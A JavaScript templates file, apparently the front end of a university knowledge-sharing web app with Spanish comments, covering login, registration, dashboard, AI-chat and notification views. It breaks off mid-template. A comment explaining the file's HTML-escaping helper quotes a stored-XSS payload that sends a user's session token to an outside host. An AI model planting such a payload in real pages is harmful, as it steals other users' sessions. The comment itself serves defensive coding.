import { config } from './config.js';

/**
 * Escapa texto antes de insertarlo en HTML.
 *
 * Todas las plantillas de este archivo construyen HTML con plantillas literales
 * y lo inyectan con innerHTML. Sin escapar, cualquier dato escrito por un
 * usuario (nombre, título de recurso, mensaje de chat, nota...) se interpreta
 * como HTML: basta con registrarse con el nombre
 *     <img src=x onerror="fetch('...'+localStorage.token)">
 * para robar la sesión de cualquiera que vea ese nombre. Es un XSS almacenado.
 *
 * Se usa el parser del navegador para convertir los caracteres peligrosos.
 */
function escapeHtml(value) {
    if (value === null || value === undefined) return '';
    return String(value)
        .replace(/&/g, '&amp;')
        .replace(/</g, '&lt;')
        .replace(/>/g, '&gt;')
        .replace(/"/g, '&quot;')
        .replace(/'/g, '&#39;');
}

// Alias corto, porque se usa en casi todas las plantillas.
const esc = escapeHtml;

const templates = {

    /**
     * Dibuja la pantalla de Inicio de Sesión
     */
    loginScreen() {
        return /*html*/`
        <div class="min-h-screen flex items-center justify-center bg-gradient-to-br from-blue-50 to-gray-100 p-4">
            <div class="bg-white p-8 rounded-2xl shadow-2xl w-full max-w-md transform transition-all duration-500 hover:shadow-xl animate-fade-in">
                
                <!-- Logo -->
                <div class="text-center mb-6">
                    <img src="img/logo_ufg.png" alt="UFG Knowledge Hub" class="h-16 w-auto mx-auto object-contain" 
                         onerror="this.onerror=null; this.src='https://placehold.co/160x64/ffffff/004a99?text=UFG+Logo'; this.classList.add('h-16', 'mx-auto', 'object-contain');">
                </div>
                
                <h2 class="text-2xl font-bold text-center text-gray-800 mb-2">Knowledge Hub</h2>
                <p class="text-center text-gray-500 mb-6">Bienvenido de nuevo</p>
                
                <!-- Formulario de Inicio de Sesión -->
                <form id="login-form" autocomplete="off" class="space-y-4">
                    <input style="display: none;" type="text" name="fakeusername">
                    <input style="display: none;" type="password" name="fakepassword">
                    
                    <div class="transform transition-all duration-300 hover:scale-[1.02]">
                        <label for="login-email" class="block text-sm font-medium text-gray-700 mb-1">Correo Electrónico</label>
                        <div class="relative">
                            <svg class="absolute left-3 top-1/2 transform -translate-y-1/2 text-gray-400 w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M16 12a4 4 0 10-8 0 4 4 0 008 0zm0 0v1.5a2.5 2.5 0 005 0V12a9 9 0 10-9 9m4.5-1.206a8.959 8.959 0 01-4.5 1.207"></path>
                            </svg>
                            <input type="email" 
                                   id="login-email" 
                                   name="login"
                                   autocomplete="new-username"
                                   class="w-full pl-10 pr-4 py-3 border border-gray-300 rounded-lg focus:border-blue-500 focus:ring-2 focus:ring-blue-200 transition-all duration-300 placeholder-gray-400" 
                                   placeholder="tu@correo.ufg.edu.sv"
                                   required>
                        </div>
                    </div>
                    
                    <div class="transform transition-all duration-300 hover:scale-[1.02]">
                        <label for="login-password" class="block text-sm font-medium text-gray-700 mb-1">Contraseña</label>
                        <div class="relative">
                            <svg class="absolute left-3 top-1/2 transform -translate-y-1/2 text-gray-400 w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z"></path>
                            </svg>
                            <input type="password" 
                                   id="login-password" 
                                   name="pass"
                                   autocomplete="new-password"
                                   class="w-full pl-10 pr-4 py-3 border border-gray-300 rounded-lg focus:border-blue-500 focus:ring-2 focus:ring-blue-200 transition-all duration-300 placeholder-gray-400" 
                                   placeholder="Ingresa tu contraseña"
                                   required>
                        </div>
                    </div>
                    
                    <button type="submit" 
                            class="w-full bg-blue-600 text-white py-3 px-6 rounded-lg font-semibold shadow-lg hover:bg-blue-700 transform hover:scale-[1.02] hover:shadow-xl active:scale-95 transition-all duration-300 focus:outline-none focus:ring-2 focus:ring-blue-500 focus:ring-offset-2">
                        <span class="flex items-center justify-center gap-2">
                            <svg class="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M11 16l-4-4m0 0l4-4m-4 4h14m-5 4v1a3 3 0 01-3 3H6a3 3 0 01-3-3V7a3 3 0 013-3h7a3 3 0 013 3v1"></path>
                            </svg>
                            Iniciar Sesión
                        </span>
                    </button>
                </form>
                
                <!-- Enlace a Registro -->
                <div class="text-center mt-6 pt-6 border-t border-gray-100">
                    <p class="text-gray-600 text-sm">
                        ¿No tienes una cuenta? 
                        <a href="#" id="show-register" class="font-medium text-blue-600 hover:text-blue-700 ml-1 transition-colors duration-200">
                            Regístrate aquí
                        </a>
                    </p>
                </div>
            </div>
        </div>
        `;
    },

    /**
 * Genera las opciones de color para el avatar
 */
getColorOptions() {
    const colors = [
        { value: '#3B82F6', name: 'Azul', class: 'bg-blue-500' },
        { value: '#EF4444', name: 'Rojo', class: 'bg-red-500' },
        { value: '#10B981', name: 'Verde', class: 'bg-green-500' },
        { value: '#F59E0B', name: 'Ámbar', class: 'bg-yellow-500' },
        { value: '#8B5CF6', name: 'Violeta', class: 'bg-purple-500' },
        { value: '#EC4899', name: 'Rosa', class: 'bg-pink-500' },
        { value: '#06B6D4', name: 'Cian', class: 'bg-cyan-500' },
        { value: '#F97316', name: 'Naranja', class: 'bg-orange-500' }
    ];

    return colors.map(color => /*html*/`
        <label class="flex flex-col items-center cursor-pointer group">
            <input type="radio" name="profile_color" value="${color.value}" 
                   class="hidden peer" ${color.value === '#3B82F6' ? 'checked' : ''}>
            <div class="w-10 h-10 ${color.class} rounded-full flex items-center justify-center text-white font-bold text-sm shadow-lg transform transition-all duration-300 group-hover:scale-110 peer-checked:ring-4 peer-checked:ring-offset-2 peer-checked:ring-gray-400">
                <span class="opacity-0 peer-checked:opacity-100 transition-opacity duration-300">✓</span>
            </div>
            <span class="text-xs text-gray-600 mt-1">${esc(color.name)}</span>
        </label>
    `).join('');
},

   /**
 * Dibuja la pantalla de Registro CON SELECTOR DE COLOR
 */
registerScreen() {
    return /*html*/`
    <div class="min-h-screen flex items-center justify-center bg-gradient-to-br from-blue-50 to-gray-100 p-4">
        <div class="bg-white p-8 rounded-2xl shadow-2xl w-full max-w-md transform transition-all duration-500 hover:shadow-xl animate-fade-in">
            
            <!-- Logo -->
            <div class="text-center mb-6">
                <img src="img/logo_ufg.png" alt="UFG Knowledge Hub" class="h-16 w-auto mx-auto object-contain" 
                     onerror="this.onerror=null; this.src='https://placehold.co/160x64/ffffff/004a99?text=UFG+Logo'; this.classList.add('h-16', 'mx-auto', 'object-contain');">
            </div>
            
            <h2 class="text-2xl font-bold text-center text-gray-800 mb-2">Crear Cuenta</h2>
            <p class="text-center text-gray-500 mb-6">Únete a UFG Knowledge Hub</p>
            
            <!-- Formulario de Registro -->
            <form id="register-form" autocomplete="off" class="space-y-4">
                <div class="transform transition-all duration-300 hover:scale-[1.02]">
                    <label for="register-name" class="block text-sm font-medium text-gray-700 mb-1">Nombre Completo</label>
                    <div class="relative">
                        <svg class="absolute left-3 top-1/2 transform -translate-y-1/2 text-gray-400 w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M16 7a4 4 0 11-8 0 4 4 0 018 0zM12 14a7 7 0 00-7 7h14a7 7 0 00-7-7z"></path>
                        </svg>
                        <input type="text" 
                               id="register-name" 
                               autocomplete="name"
                               class="w-full pl-10 pr-4 py-3 border border-gray-300 rounded-lg focus:border-blue-500 focus:ring-2 focus:ring-blue-200 transition-all duration-300 placeholder-gray-400" 
                               placeholder="Tu Nombre Completo" 
                               required>
                    </div>
                </div>

                <div class="transform transition-all duration-300 hover:scale-[1.02]">
                    <label for="register-email" class="block text-sm font-medium text-gray-700 mb-1">Correo Electrónico</label>
                    <div class="relative">
                        <svg class="absolute left-3 top-1/2 transform -translate-y-1/2 text-gray-400 w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M16 12a4 4 0 10-8 0 4 4 0 008 0zm0 0v1.5a2.5 2.5 0 005 0V12a9 9 0 10-9 9m4.5-1.206a8.959 8.959 0 01-4.5 1.207"></path>
                        </svg>
                        <input type="email" 
                               id="register-email" 
                               autocomplete="email"
                               class="w-full pl-10 pr-4 py-3 border border-gray-300 rounded-lg focus:border-blue-500 focus:ring-2 focus:ring-blue-200 transition-all duration-300 placeholder-gray-400" 
                               placeholder="tu@correo.ufg.edu.sv" 
                               required>
                    </div>
                </div>
                
                <div class="transform transition-all duration-300 hover:scale-[1.02]">
                    <label for="register-password" class="block text-sm font-medium text-gray-700 mb-1">Contraseña</label>
                    <div class="relative">
                        <svg class="absolute left-3 top-1/2 transform -translate-y-1/2 text-gray-400 w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z"></path>
                        </svg>
                        <input type="password" 
                               id="register-password" 
                               autocomplete="new-password"
                               class="w-full pl-10 pr-4 py-3 border border-gray-300 rounded-lg focus:border-blue-500 focus:ring-2 focus:ring-blue-200 transition-all duration-300 placeholder-gray-400" 
                               placeholder="Mínimo 6 caracteres" 
                               required>
                    </div>
                </div>

                <!-- 🆕 NUEVO: Selector de Color para Avatar -->
                <div class="transform transition-all duration-300 hover:scale-[1.02]">
                    <label class="block text-sm font-medium text-gray-700 mb-3">Color de tu Avatar</label>
                    <div class="flex justify-between gap-2">
                        ${this.getColorOptions()}
                    </div>
                    <p class="text-xs text-gray-500 mt-2 text-center">
                        Tu avatar mostrará tus iniciales con el color seleccionado
                    </p>
                </div>
                
                <button type="submit" 
                        class="w-full bg-green-600 text-white py-3 px-6 rounded-lg font-semibold shadow-lg hover:bg-green-700 transform hover:scale-[1.02] hover:shadow-xl active:scale-95 transition-all duration-300 focus:outline-none focus:ring-2 focus:ring-green-500 focus:ring-offset-2">
                    <span class="flex items-center justify-center gap-2">
                        <svg class="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M18 9v3m0 0v3m0-3h3m-3 0h-3m-2-5a4 4 0 11-8 0 4 4 0 018 0zM3 20a6 6 0 0112 0v1H3v-1z"></path>
                        </svg>
                        Crear Cuenta
                    </span>
                </button>
            </form>
            
            <!-- Enlace a Inicio de Sesión -->
            <div class="text-center mt-6 pt-6 border-t border-gray-100">
                <p class="text-gray-600 text-sm">
                    ¿Ya tienes una cuenta? 
                    <a href="#" id="show-login" class="font-medium text-blue-600 hover:text-blue-700 ml-1 transition-colors duration-200">
                        Inicia sesión
                    </a>
                </p>
            </div>
        </div>
    </div>
    `;
},
   /**
 * Dibuja el Panel de Control Principal (Dashboard)
 */
/**
 * Dibuja el Panel de Control Principal (Dashboard)
 */
dashboardScreen(userName, viewHtml) {
    const firstName = userName ? userName.split(' ')[0] : 'Usuario';
    
    return /*html*/`
    <!-- 1. Encabezado Fijo -->
    <header id="app-header" class="fixed top-0 left-0 right-0 z-20 flex items-center justify-between h-20 px-6 bg-gradient-to-r from-blue-800 to-blue-900 text-white shadow-lg">
        <!-- Logo -->
        <div class="flex items-center gap-3 transform transition-transform duration-300 hover:scale-105">
            <img src="img/logo_hub.png" alt="UFG Knowledge Hub" class="h-14 w-14 object-contain header-logo" 
                 onerror="this.onerror=null; this.src='https://placehold.co/56x56/ffffff/004a99?text=HUB'; this.classList.add('h-14', 'w-14', 'object-contain', 'header-logo');">
        </div>
        
        <!-- Perfil y Controles -->
        <div class="flex items-center gap-4"> 
            <span class="hidden sm:inline text-blue-100 text-lg font-medium">Hola, ${esc(firstName)}</span>

            <!--
                Campana de notificaciones. app.js ya actualizaba el contador
                buscando #notification-badge, pero ese elemento no existía en
                ninguna plantilla: las notificaciones se cargaban y no se veían.
            -->
            <button id="notifications-button" class="relative flex items-center p-3 rounded-xl hover:bg-blue-700 transition-all duration-300 transform hover:scale-105" title="Notificaciones">
                <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
                    <path d="M18 8A6 6 0 0 0 6 8c0 7-3 9-3 9h18s-3-2-3-9"></path>
                    <path d="M13.73 21a2 2 0 0 1-3.46 0"></path>
                </svg>
                <span id="notification-badge" class="hidden absolute -top-0.5 -right-0.5 bg-red-500 text-white text-xs font-bold rounded-full min-w-[1.25rem] h-5 px-1 flex items-center justify-center">0</span>
            </button>

            <button id="logout-button" class="flex items-center gap-3 p-3 rounded-xl hover:bg-blue-700 transition-all duration-300 transform hover:scale-105" title="Cerrar Sesión">
                <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
                    <path d="M9 21H5a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h4"></path>
                    <polyline points="16 17 21 12 16 7"></polyline>
                    <line x1="21" y1="12" x2="9" y2="12"></line>
                </svg>
                <span class="hidden sm:inline text-lg">Cerrar Sesión</span>
            </button>
        </div>
    </header>

    <!-- 2. Contenedor Principal -->
    <div id="app-container" class="flex pt-20 h-screen">
        <!-- Menú Lateral -->
        <nav id="app-sidebar" class="w-64 bg-white shadow-xl overflow-y-auto z-10 hidden md:block transform transition-all duration-300">
            <ul class="py-4"></ul>
        </nav>

        <!-- 3. Contenido Principal -->
        <main id="dashboard-content" class="flex-1 p-6 md:p-8 lg:p-10 overflow-y-auto bg-gradient-to-br from-gray-50 to-blue-50">
            ${viewHtml}
        </main>
    </div>

    <!-- 4. Modal -->
    <div id="resource-modal-overlay" class="fixed inset-0 bg-black bg-opacity-50 z-30 hidden flex items-center justify-center p-4 backdrop-blur-sm"></div>
    
    <!-- Modal de Notificaciones -->
    <div id="notifications-modal" class="fixed inset-0 bg-black bg-opacity-50 z-40 hidden flex items-center justify-center p-4 backdrop-blur-sm"></div>

    <!-- Modal de Detalle de Grupo -->
    <div id="group-detail-modal" class="fixed inset-0 bg-black bg-opacity-50 z-40 hidden flex items-center justify-center p-4 backdrop-blur-sm"></div>

    <!--
        Asistente de IA. El panel se rellena desde templates.aiPanel() al abrirlo.
        El backend todavía no expone /api/ai/*, así que el widget avisa de que no
        está conectado en lugar de fallar (ver js/ai.js).
    -->
    <button id="ai-toggle-button"
            class="fixed bottom-6 right-6 z-40 w-14 h-14 rounded-full bg-ufg-blue text-white shadow-2xl hover:bg-ufg-blue-dark hover:scale-110 transition-all duration-300 flex items-center justify-center"
            title="Asistente de IA">
        <svg xmlns="http://www.w3.org/2000/svg" width="26" height="26" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
            <path d="M21 15a2 2 0 0 1-2 2H7l-4 4V5a2 2 0 0 1 2-2h14a2 2 0 0 1 2 2z"></path>
            <line x1="8" y1="10" x2="8" y2="10"></line>
            <line x1="12" y1="10" x2="12" y2="10"></line>
            <line x1="16" y1="10" x2="16" y2="10"></line>
        </svg>
    </button>
    <div id="ai-panel" class="hidden fixed bottom-24 right-6 z-40 w-[min(26rem,calc(100vw-3rem))] max-h-[min(34rem,calc(100vh-9rem))]"></div>
    `;
},

    /**
     * Panel del asistente de IA.
     *
     * `estado` viene de ai.consultarEstado(). Mientras el backend no implemente
     * /api/ai/*, llega con disponible=false y se muestra un aviso explicativo
     * en lugar de dejar el campo de escritura activo sin que haga nada.
     */
    aiPanel(mensajes = [], estado = {}) {
        const disponible = estado.disponible === true;

        const aviso = disponible ? '' : /*html*/`
            <div class="mx-4 mt-3 p-3 rounded-lg bg-amber-50 border border-amber-200 text-xs text-amber-800">
                <p class="font-semibold mb-0.5">Asistente aún no conectado</p>
                <p>${esc(estado.mensaje || 'Falta activarlo en el servidor.')}</p>
            </div>
        `;

        const bienvenida = /*html*/`
            <div class="text-center text-gray-500 text-sm py-8 px-4">
                <p class="font-medium text-gray-700 mb-1">Asistente del Knowledge Hub</p>
                <p class="text-xs">Pregunta sobre los documentos que la comunidad ha compartido.</p>
                <p class="text-xs mt-3 text-gray-400">Por ejemplo: «¿Qué material hay sobre bases de datos?»</p>
            </div>
        `;

        const historial = mensajes.length
            ? mensajes.map(m => templates.aiMessage(m)).join('')
            : bienvenida;

        return /*html*/`
        <div class="bg-white rounded-2xl shadow-2xl border border-gray-200 flex flex-col max-h-[min(34rem,calc(100vh-9rem))]">
            <div class="flex justify-between items-center px-4 py-3 border-b border-gray-200 bg-ufg-blue text-white rounded-t-2xl">
                <div class="flex items-center gap-2 min-w-0">
                    <span class="w-2 h-2 rounded-full ${disponible ? 'bg-green-400' : 'bg-gray-400'} flex-shrink-0"></span>
                    <h3 class="font-bold text-sm truncate">Asistente IA</h3>
                    ${estado.modelo ? `<span class="text-[10px] text-blue-200 truncate">${esc(estado.modelo)}</span>` : ''}
                </div>
                <div class="flex items-center gap-1">
                    <button type="button" id="ai-reset-button" class="p-1.5 rounded-lg hover:bg-white/20 transition-colors" title="Nueva conversación">
                        <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
                            <path d="M3 2v6h6"></path>
                            <path d="M3 13a9 9 0 1 0 3-7.7L3 8"></path>
                        </svg>
                    </button>
                    <button type="button" id="ai-close-button" class="p-1.5 rounded-lg hover:bg-white/20 transition-colors" title="Cerrar">
                        <svg xmlns="http://www.w3.org/2000/svg" class="h-4 w-4" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M6 18L18 6M6 6l12 12" />
                        </svg>
                    </button>
                </div>
            </div>

            ${aviso}

            <div id="ai-messages" class="flex-1 overflow-y-auto px-4 py-3 space-y-3 min-h-[12rem]">
                ${historial}
            </div>

            <form id="ai-form" class="border-t border-gray-200 p-3 flex gap-2">
                <input type="text" id="ai-input" autocomplete="off"
                       class="flex-1 min-w-0 border border-gray-300 rounded-lg px-3 py-2 text-sm focus:ring-2 focus:ring-ufg-blue focus:border-transparent outline-none"
                       placeholder="${disponible ? 'Escribe tu pregunta...' : 'Disponible al activar el asistente'}">
                <button type="submit" id="ai-send-button"
                        class="bg-ufg-blue text-white px-3 py-2 rounded-lg text-sm font-medium hover:bg-ufg-blue-dark disabled:opacity-40 disabled:cursor-not-allowed transition-colors flex-shrink-0">
                    <svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
                        <line x1="22" y1="2" x2="11" y2="13"></line>
                        <polygon points="22 2 15 22 11 13 2 9 22 2"></polygon>
                    </svg>
                </button>
            </form>
        </div>
        `;
    },

    /**
     * Una burbuja del chat del asistente.
     * `rol` es 'user', 'assistant' o 'error'. Las fuentes citadas sólo aparecen
     * en respuestas del asistente y son la garantía de que la respuesta sale de
     * documentos reales de la plataforma, no de la memoria del modelo.
     */
    aiMessage(mensaje) {
        const { rol, texto, fuentes = [], pendiente = false } = mensaje;

        if (rol === 'user') {
            return /*html*/`
                <div class="flex justify-end">
                    <div class="bg-ufg-blue text-white rounded-2xl rounded-br-sm px-3.5 py-2 max-w-[85%] text-sm break-words">
                        ${esc(texto)}
                    </div>
                </div>
            `;
        }

        if (rol === 'error') {
            return /*html*/`
                <div class="flex justify-start">
                    <div class="bg-red-50 border border-red-200 text-red-700 rounded-2xl rounded-bl-sm px-3.5 py-2 max-w-[90%] text-sm break-words">
                        ${esc(texto)}
                    </div>
                </div>
            `;
        }

        if (pendiente) {
            return /*html*/`
                <div class="flex justify-start">
                    <div class="bg-gray-100 text-gray-500 rounded-2xl rounded-bl-sm px-3.5 py-2 text-sm">
                        <span class="inline-flex gap-1 items-center">
                            Pensando
                            <span class="animate-pulse">...</span>
                        </span>
                    </div>
                </div>
            `;
        }

        const citas = fuentes.length ? /*html*/`
            <div class="mt-2 pt-2 border-t border-gray-200 space-y-1">
                <p class="text-[10px] uppercase tracking-wide text-gray-400 font-semibold">Fuentes</p>
                ${fuentes.map(f => /*html*/`
                    <div class="text-xs text-gray-600">
                        <span class="font-medium">${esc(f.title || 'Documento')}</span>
                        ${f.snippet ? `<span class="text-gray-500"> — ${esc(f.snippet)}</span>` : ''}
                    </div>
                `).join('')}
            </div>
        ` : '';

        return /*html*/`
            <div class="flex justify-start">
                <div class="bg-gray-100 text-gray-800 rounded-2xl rounded-bl-sm px-3.5 py-2 max-w-[90%] text-sm break-words">
                    ${esc(texto)}
                    ${citas}
                </div>
            </div>
        `;
    },

    /**
     * Panel de notificaciones. El modal contenedor ya existía en el dashboard,
     * pero nunca se rellenaba porque no había plantilla ni manejador.
     */
    notificationsPanel(notifications = []) {
        const iconos = {
            contact_request: '👤',
            contact_accepted: '✅',
            message: '💬',
            group_invite: '👥'
        };

        const lista = notifications.length
            ? notifications.map(n => /*html*/`
                <div class="p-4 border-b border-gray-100 ${n.read ? 'bg-white' : 'bg-blue-50'}">
                    <div class="flex items-start gap-3">
                        <span class="text-xl">${iconos[n.type] || '🔔'}</span>
                        <div class="flex-1 min-w-0">
                            <p class="font-medium text-sm text-gray-800">${esc(n.title)}</p>
                            <p class="text-sm text-gray-600 mt-0.5">${esc(n.message)}</p>
                            <p class="text-xs text-gray-400 mt-1">${new Date(n.created_at).toLocaleString()}</p>
                        </div>
                        ${!n.read ? /*html*/`
                            <button class="mark-read-btn text-xs text-blue-600 hover:text-blue-800 whitespace-nowrap"
                                    data-notification-id="${n.id}">Marcar leída</button>
                        ` : ''}
                    </div>
                </div>
            `).join('')
            : '<p class="text-center text-gray-500 py-10">No tienes notificaciones</p>';

        return /*html*/`
        <div class="bg-white rounded-2xl shadow-2xl w-full max-w-md max-h-[80vh] flex flex-col overflow-hidden">
            <div class="flex justify-between items-center p-5 border-b border-gray-200">
                <h3 class="text-lg font-bold text-gray-900">Notificaciones</h3>
                <button type="button" id="close-notifications-modal" class="text-gray-400 hover:text-gray-600">
                    <svg xmlns="http://www.w3.org/2000/svg" class="h-6 w-6" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M6 18L18 6M6 6l12 12" />
                    </svg>
                </button>
            </div>
            <div class="overflow-y-auto">${lista}</div>
        </div>
        `;
    },
    /**
     * Dibuja los enlaces del menú lateral
     */
    sidebarLinks(currentView) {
        const sections = [
            {
                type: 'header',
                title: 'COMUNIDAD UFG'
            },
            {
                id: 'home',
                text: 'Inicio',
                icon: 'M3 12l2-2m0 0l7-7 7 7M5 10v10a1 1 0 001 1h3m10-11l2 2m-2-2v10a1 1 0 01-1 1h-3m-6 0a1 1 0 001-1v-4a1 1 0 011-1h2a1 1 0 011 1v4a1 1 0 001 1m-6 0h6',
                badge: null
            },
            {
                id: 'library',
                text: 'Biblioteca Compartida',
                icon: 'M8 14v3m4-3v3m4-3v3M3 21h18M3 10h18M3 7l9-4 9 4M4 10h16v11H4V10z',
                badge: null
            },
            {
                id: 'groups',
                text: 'Grupos de Trabajo',
                icon: 'M17 20h5v-2a3 3 0 00-5.356-1.857M17 20H7m10 0v-2c0-.656-.126-1.283-.356-1.857M7 20H2v-2a3 3 0 015.356-1.857M7 20v-2c0-.656.126-1.283.356-1.857m0 0a5.002 5.002 0 019.288 0M15 7a3 3 0 11-6 0 3 3 0 016 0zm6 3a2 2 0 11-4 0 2 2 0 014 0zM7 10a2 2 0 11-4 0 2 2 0 014 0z',
                badge: null
            },
            {
                type: 'divider'
            },
            {
                type: 'header', 
                title: 'MI ESPACIO'
            },
            {
                id: 'contacts',
                text: 'Contactos',
                icon: 'M17 20h5v-2a3 3 0 00-5.356-1.857M17 20H7m10 0v-2c0-.656-.126-1.283-.356-1.857M7 20H2v-2a3 3 0 015.356-1.857M7 20v-2c0-.656.126-1.283.356-1.857m0 0a5.002 5.002 0 019.288 0M15 7a3 3 0 11-6 0 3 3 0 016 0zm6 3a2 2 0 11-4 0 2 2 0 014 0zM7 10a2 2 0 11-4 0 2 2 0 014 0z',
                badge: null
            },
            {
                id: 'notes',
                text: 'Anotaciones',
                icon: 'M11 5H6a2 2 0 00-2 2v11a2 2 0 002 2h11a2 2 0 002-2v-5m-1.414-9.414a2 2 0 112.828 2.828L11.828 15H9v-2.828l8.586-8.586z',
                badge: null
            },
            {
                id: 'profile',
                text: 'Mi Perfil',
                icon: 'M16 7a4 4 0 11-8 0 4 4 0 018 0zM12 14a7 7 0 00-7 7h14a7 7 0 00-7-7z',
                badge: null
            }
        ];

        return sections.map(section => {
            if (section.type === 'header') {
                return /*html*/`
                    <li class="px-4 py-2">
                        <span class="text-xs font-semibold text-gray-500 uppercase tracking-wider">${esc(section.title)}</span>
                    </li>
                `;
            }
            
            if (section.type === 'divider') {
                return /*html*/`
                    <li class="border-t border-gray-200 my-2"></li>
                `;
            }

            const isActive = section.id === currentView;
            return /*html*/`
                <li class="mx-2 my-1">
                    <a href="#" 
                       class="flex items-center justify-between px-4 py-3 text-sm font-semibold rounded-xl transition-all duration-300 transform hover:scale-105 ${
                           isActive 
                           ? 'text-white bg-gradient-to-r from-blue-500 to-blue-600 shadow-lg' 
                           : 'text-gray-700 hover:bg-blue-50 hover:text-blue-600'
                       }" 
                       data-view="${section.id}">
                        <div class="flex items-center gap-3">
                            <svg xmlns="http://www.w3.org/2000/svg" class="h-5 w-5" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2">
                                <path stroke-linecap="round" stroke-linejoin="round" d="${section.icon}" />
                            </svg>
                            <span>${section.text}</span>
                        </div>
                        ${section.badge ? /*html*/`
                            <span class="bg-red-500 text-white text-xs px-2 py-1 rounded-full animate-pulse">
                                ${section.badge}
                            </span>
                        ` : ''}
                    </a>
                </li>
            `;
        }).join('');
    },

    /**
     * Dibuja el contenido de la página de Inicio FUNCIONAL
     */
    homeContent(resources = [], chatMessages = [], userStats = {}) {
        const recentResources = resources.slice(0, 6);
        const uniqueContributors = new Set(resources.map(r => r.owner_name)).size;
        const uniqueCategories = new Set(resources.map(r => r.category)).size;
        
        return /*html*/`
        <div class="max-w-7xl mx-auto animate-fade-in">
            <!-- Header -->
            <header class="mb-8">
                <h1 class="text-4xl font-bold text-gray-800 mb-2 bg-gradient-to-r from-blue-600 to-blue-800 bg-clip-text text-transparent">
                    🏠 Inicio UFG Knowledge Hub
                </h1>
                <p class="text-gray-600">Bienvenido a tu centro de conocimiento universitario</p>
            </header>

            <div class="grid grid-cols-1 lg:grid-cols-3 gap-8">
                <!-- Columna Izquierda - Recursos Destacados -->
                <div class="lg:col-span-2 space-y-6">
                    <!-- Recursos Recientes -->
                    <div class="bg-white rounded-2xl shadow-lg p-6">
                        <div class="flex items-center justify-between mb-6">
                            <h2 class="text-xl font-bold text-gray-800 flex items-center gap-2">
                                <svg class="w-5 h-5 text-blue-500" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M13 7h8m0 0v8m0-8l-8 8-4-4-6 6"></path>
                                </svg>
                                Recursos Recientes
                            </h2>
                            <span class="text-sm text-gray-500">${resources.length} recursos disponibles</span>
                        </div>
                        
                        ${recentResources.length > 0 ? /*html*/`
                            <div class="grid grid-cols-1 md:grid-cols-2 gap-4">
                                ${recentResources.map(resource => /*html*/`
                                    <div class="border border-gray-200 rounded-xl p-4 hover:shadow-md transition-all duration-300 transform hover:scale-[1.02]">
                                        <div class="flex items-start justify-between mb-2">
                                            <h3 class="font-semibold text-gray-800 text-sm line-clamp-2">${esc(resource.title)}</h3>
                                            <span class="text-xs bg-blue-100 text-blue-700 px-2 py-1 rounded-full">${esc(resource.category)}</span>
                                        </div>
                                        <p class="text-xs text-gray-600 mb-3">Por: ${esc(resource.owner_name)}</p>
                                        <div class="flex items-center justify-between">
                                            <span class="text-xs text-gray-500">${new Date(resource.created_at).toLocaleDateString()}</span>
                                            <a href="${config.API_URL}/api/uploads/${encodeURIComponent(resource.filename)}" 
                                               target="_blank"
                                               class="text-blue-600 hover:text-blue-800 text-xs font-medium">
                                                Ver archivo
                                            </a>
                                        </div>
                                    </div>
                                `).join('')}
                            </div>
                        ` : /*html*/`
                            <div class="text-center py-8">
                                <svg class="w-16 h-16 text-gray-300 mx-auto mb-4" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 12h6m-6 4h6m2 5H7a2 2 0 01-2-2V5a2 2 0 012-2h5.586a1 1 0 01.707.293l5.414 5.414a1 1 0 01.293.707V19a2 2 0 01-2 2z"></path>
                                </svg>
                                <p class="text-gray-500">Aún no hay recursos compartidos</p>
                                <p class="text-sm text-gray-400 mt-1">Sé el primero en compartir conocimiento</p>
                            </div>
                        `}
                    </div>

                    <!-- Estadísticas Rápidas - CENTRADAS SIN "EN LÍNEA" -->
                    <div class="grid grid-cols-3 gap-4 justify-center">
                        <div class="bg-gradient-to-br from-blue-500 to-blue-600 text-white rounded-xl p-4 text-center">
                            <div class="text-2xl font-bold">${resources.length}</div>
                            <div class="text-xs opacity-90">Recursos</div>
                        </div>
                        <div class="bg-gradient-to-br from-green-500 to-green-600 text-white rounded-xl p-4 text-center">
                            <div class="text-2xl font-bold">${uniqueContributors}</div>
